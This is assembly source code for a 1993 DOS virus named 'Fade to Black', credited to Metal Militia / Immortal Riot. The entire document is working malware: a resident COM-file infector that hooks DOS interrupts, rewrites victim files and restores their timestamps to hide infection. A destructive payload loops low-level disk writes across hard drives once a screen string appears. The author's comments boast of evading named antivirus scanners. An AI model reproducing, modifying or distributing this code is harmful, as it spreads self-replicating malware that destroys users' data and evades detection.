; VirusName: Fade to Black
; Country  : Sweden
; Author   : Metal Militia / Immortal Riot
; Date     : 07-29-1993
;
; This is a mutation of	Creeping Tormentor, whick was discovered
; in Feb 1992. The origin is "unknown" (attention Patricica), it's
; written  in Sweden by Tormentor / Demoralized Youth
; Many thanx goes to Tormentor for the original code.
;
; This is a Parasite, Resident, Appending COM-files infector.
; Searches for the string sUMsDos (?) in memory.
; search for Jerusalen, and if it's locate it, crash the HD.
;
; This will just fine, and
; McAfee Scan v105 can't find it, and
; S&S Toolkit 6.5 don't find it either.
;
; I haven't tried with scanners like Fprot/Tbscan,
; but they will probably report some virus structure.
;
; Best Regards : [Metal Militia]
;	        [The Unforgiven]


code            segment byte public
                assume  cs:code, ds:code, es:code, ss:code
  
  
		org	100h
  
  
codebeg:
  

                mov     ax,0700h                ; Remove virus from code!
                int     21h ;^-- Scan string (before it was ax,043FFh)

; Let's allocate some mem!

		mov	ax,ds
		sub	ax,11h
		mov	ds,ax
		cmp	byte ptr ds:[0100h],5Ah
		jnz	skip
		mov	ax,ds:[0103h]
		sub	ax,40h
		jb	skip
		mov	ds:[0103h],ax
		sub	word ptr ds:[0112h],50h
		mov	es,ds:[0112h]
		push	cs
		pop	ds
		mov	cx,code_end-codebeg
		mov	di,100h
		push	di
		mov	si,di
		rep	movsb

		push 	es
		pop	ds

		mov	ax,351Ch
		int	21h
		mov	word ptr ds:[int1Cret],bx
		mov	word ptr ds:[int1Cret+2],es
		mov	al,21h
		int	21h
		mov	word ptr ds:[real21+1],bx
		mov	word ptr ds:[real21+3],es
		
		mov	ah,25h
		mov	dx,offset int21beg
		int	21h
		mov	al,1Ch
		mov	dx,offset int1Cnew
		int	21h
	
		push	cs
		push	cs
		pop	es
		pop	ds
	
		ret

skip:		int	20h		
		

int21beg:	push	ax
		sub	ax,4B00h
		jz	infect
		pop	ax
                cmp     ax,0700h                ; Check if ....
		jne	real21
		
		mov	ax,word ptr ds:[retdata]
		mov	si,ax
		mov	di,100h
		mov	cx,code_end-codebeg
		rep	movsb

		mov	ax,100h
	
		pop	cx
		pop	cx
		push	es
		push	ax
		iret

real21:		db	0EAh, 00h, 00h, 00h, 00h	; Jump to org21vec.


retdata:	db	00h, 00h

f_time:		dw	0000h

f_date:		dw	0000h	

infect:		pop	ax

		push	ax
		push	bx
		push	cx
		push	di
		push	ds
		push	dx
		push	si		

	
		mov	ah,43h			; Get file attr.
		int	21h
		mov	ax,4301h
		and	cx,0FEh			; Strip the Read-only-flag
		int	21h

		mov	ax,3D02h		; Open victim.
		int	21h

		xchg	ax,bx

		call	sub_2  

sub_2:		mov	di,sp			; God what I hate that Eskimo!
		mov 	si,ss:[di]
		inc	sp
		inc	sp

		push	cs
		pop	ds

		mov	ax,5700h		; Get file's time and date
		int	21h
		mov	[si-(sub_2-f_time)],cx	
		mov	[si-(sub_2-f_date)],dx	; And save them...

		mov	ah,3Fh			; Read X byte from begin.
		mov	cx,code_end-codebeg
		add	si,code_end-sub_2	; SI points to EOF	
		mov	dx,si
		int	21h			

		
                cmp     word ptr [si],'MZ'      ; Mark Zimbowski? (EXE?)
		je	close
                cmp     word ptr [si],'ZM'      ; Zimbowski Mark? (EXE?)
		je 	close	
mark:           cmp     word ptr [si+(mark-codebeg+4)],'½¾'     ; infected?
                je      close

		call	put_eof			; move file ptr to EOF

		cmp	ax,(0FFFFh-(code_end-codebeg)-100h)
		ja	close
		cmp	ax,code_end-codebeg+100h
		jb	close

		add	ax,100h
		mov	word ptr ds:[si-(code_end-retdata)],ax	

		mov	ah,40h			; Flytta (move) beg to end.
		mov	cx,code_end-codebeg
		mov	dx,si
		int	21h
		
		mov	ax,4200h		; fptr to filbeg.
		xor 	cx,cx
		xor 	dx,dx
		int	21h
	
		mov	ah,40h			; Write virus to beg.
		mov	cx,code_end-codebeg
		mov	dx,si
		sub	dx,cx
		int	21h

close:		mov	ax,5701h
		mov	cx,[si-(code_end-f_time)]
		mov	dx,[si-(code_end-f_date)]
		int	21h

		mov	ah,3Eh			
		int	21h			; close file, bx=file handle

		pop	si
		pop	dx
		pop	ds
		pop	di
		pop	cx
		pop	bx
		pop	ax

		
		jmp	real21

put_eof:	mov 	ax,4202h
		xor	dx,dx
		xor	cx,cx
		int 	21h
		ret


int1Cnew:	

		push 	ax
		inc 	byte ptr cs:[counter]
		mov 	al,30h
		cmp 	byte ptr cs:[counter],al
		jz 	scan
		pop 	ax


quit:           jmp     dword ptr cs:[int1Cret]

scan:   	
		push 	bx
		push 	cx
		push 	di
		push	ds
		push	dx
		push	es
		push	si


		push 	cs
		pop 	ds

		cld
		xor 	bx,bx
		mov 	byte ptr cs:[counter],bh
		mov 	cx,0FA0h

		mov 	ax,0b800h
		mov 	es,ax
		xor 	di,di

again:		mov 	al,byte ptr cs:[text+bx]
		sub	al,80h
		repnz 	scasb	
		jnz 	stick

maybe:		inc 	di
		inc 	bx
		cmp 	bx,10d
		jz	beep

		mov	al,byte ptr cs:[text+bx]
		sub	al,80h
		scasb
		jz	maybe
		xor	bx,bx
		jmp	again

beep:		
		xor	cx,cx
		mov	bx,word ptr cs:[int1Cret]
		mov	es,word ptr cs:[int1Cret+2]
		mov	ax,251Ch
		int	21h

overagain:	mov	dx,0180h
		xor	bx,bx

reset:		mov	ah,00h
		inc	bx
		cmp	bl,5h
		jz	raise		
		inc	cx
		int	13h

hoho:		mov	ax,0380h
		inc	cx
		int	13h
		jc	reset
		jmp 	hoho		

raise:		xor	cx,cx
		xor	bx,bx
		inc	dx
		cmp	dl,85h
		jnz	hoho
		jmp	overagain	
					
stick:
		pop	si		
		pop	es
		pop	dx
		pop 	ds
		pop 	di
		pop 	cx
		pop 	bx 		
		pop 	ax


                jmp     quit


counter:	db 	00h

text:           db      's'+80h, 'U'+80h, 'M'+80h, 's'+80h, 'D'+80h, 'o'+80h
                db      's'+80h

                        ; This is what it scans the screen for --^ sUMsDos
			; just a little bit cryptic eh ?

int1Cret:	db	0EAh, 00h, 00h, 00h, 00h

code_end:					; THE END.

; This isn't really a bullshit note, this is a Metallica Note ;)
; which means quality! Metal Up Your Ass!

bullshit_note   db "Metal Militia / Immortal Riot     "
        DB      "Fade To Black   " 
	DB	"Things not what they used to be "
	DB	"Missing one inside of me "
	DB	"Deathly lost, this can't be real "
	DB	"Cannot stand this hell I feel... "

code            ends
end		codebeg

; Think that would be it..
